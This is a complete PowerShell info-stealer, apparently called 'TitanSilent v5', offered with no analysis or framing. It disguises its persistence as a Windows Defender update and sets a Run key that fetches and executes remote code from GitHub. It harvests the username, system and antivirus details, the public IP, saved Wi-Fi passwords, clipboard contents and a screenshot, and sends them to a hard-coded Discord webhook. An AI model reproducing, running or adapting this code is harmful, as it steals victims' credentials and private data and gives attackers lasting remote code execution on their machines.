$ErrorActionPreference = "SilentlyContinue"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$webhook = "https://discord.com/api/webhooks/1356723527486804138/8uoObVFzZbql8opsETphWlbiXPSbYSZOgSW9mxfx_-A4olDcCGD3FQvslxUJ4UjvCE_L"

function Send-Discord($msg) {
    $json = @{content = $msg} | ConvertTo-Json -Depth 3
    Invoke-RestMethod -Uri $webhook -Method POST -Body $json -ContentType 'application/json'
}

function Send-Screenshot {
    $file = "$env:TEMP\titanshot.png"
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $bitmap.Save($file, [System.Drawing.Imaging.ImageFormat]::Png)

    Invoke-RestMethod -Uri $webhook -Method Post -InFile $file -ContentType 'multipart/form-data'
    Remove-Item $file -Force
}

# Persistenz: Kopieren + Autostart
$target = "$env:APPDATA\WindowsDefender.ps1"
if (!(Test-Path $target)) {
    Copy-Item -Path $PSCommandPath -Destination $target -Force
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DefenderUpdate" /d "powershell -w hidden -ep bypass -c iex(iwr -UseBasicParsing 'https://raw.githubusercontent.com/titanxrio/ps1/main/v5.ps1')" /f
}

# IP
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip

# Systeminfo
$uname = $env:USERNAME
$pc = $env:COMPUTERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$av = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntivirusProduct" | Select-Object -ExpandProperty displayName -ErrorAction SilentlyContinue
if (!$av) { $av = "None Detected" }

# WLAN
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
$wifi = ""
foreach ($p in $profiles) {
    $pw = netsh wlan show profile name="$p" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
    $wifi += "`n$p → $pw"
}

# Clipboard
$clip = Get-Clipboard
if ($clip -eq "") { $clip = "[Empty]" }

# Full Message
$msg = "**[TitanSilent v5]**`n👤 User: $uname`n🖥️ PC: $pc`n💿 OS: $os`n🌐 IP: $ip`n🛡️ Antivirus: $av`n📡 **WLANs:**$wifi`n📋 **Clipboard:**`n$clip"
Send-Discord $msg

# Screenshot
Send-Screenshot

exit
